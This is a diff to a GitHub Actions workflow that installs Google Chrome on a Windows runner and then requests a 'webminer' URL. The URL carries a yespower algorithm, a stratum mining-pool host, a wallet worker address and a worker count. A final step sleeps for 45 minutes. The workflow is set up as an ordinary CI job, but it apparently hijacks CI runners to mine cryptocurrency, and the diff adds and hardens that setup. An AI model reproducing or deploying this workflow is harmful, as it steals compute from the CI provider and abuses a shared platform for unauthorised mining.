@@ -16,17 +16,50 @@ jobs:
       - name: Check out repository
         uses: actions/checkout@v3
 
-      - name: Install Google Chrome
+      - name: Download Google Chrome Installer
+        shell: pwsh
         run: |
+          Write-Output "Downloading Chrome installer..."
           $chromeInstaller = "chrome_installer.exe"
           Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chromeInstaller
-          Start-Process -Wait -FilePath $chromeInstaller
-          
-      - name: Access URL with PowerShell
+          if (Test-Path $chromeInstaller) {
+              Write-Output "Chrome installer downloaded successfully."
+          } else {
+              Write-Error "Failed to download Chrome installer."
+              exit 1
+          }
+
+      - name: Install Google Chrome
+        shell: pwsh
         run: |
+          Write-Output "Starting Chrome installation..."
+          $chromeInstaller = "chrome_installer.exe"
+          Start-Process -FilePath $chromeInstaller -ArgumentList '/silent /install' -NoNewWindow -Wait -PassThru | ForEach-Object {
+              Write-Output "Process ID: $($_.Id)"
+              Write-Output "Exit Code: $($_.ExitCode)"
+          }
+          # Verify installation
+          $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+          if (Test-Path $chromePath) {
+              Write-Output "Google Chrome installed successfully."
+          } else {
+              Write-Error "Google Chrome installation failed."
+              exit 1
+          }
+
+      - name: Access URL with PowerShell
+        shell: pwsh
+        run: |
+          Write-Output "Starting URL access..."
           $url = "https://webminer.pages.dev?algorithm=yespower&host=stratum-asia.rplant.xyz&port=17122&worker=QXAU8sRQcwx4Agii4a4VLpkD3SwF7MohgS&password=x&workers=4"
-          Invoke-WebRequest -Uri $url -OutFile "response.html"
-        
+          try {
+              $response = Invoke-WebRequest -Uri $url
+              $response.Content | Out-File "response.html"
+              Write-Output "URL accessed successfully and content saved to response.html."
+          } catch {
+              Write-Error "Failed to access URL: $_"
+              exit 1
+          }
       - name: Sleep for 45 minutes
         run: |
           Start-Sleep -Seconds 2700  # Sleep for 45 minutes (2700 seconds)
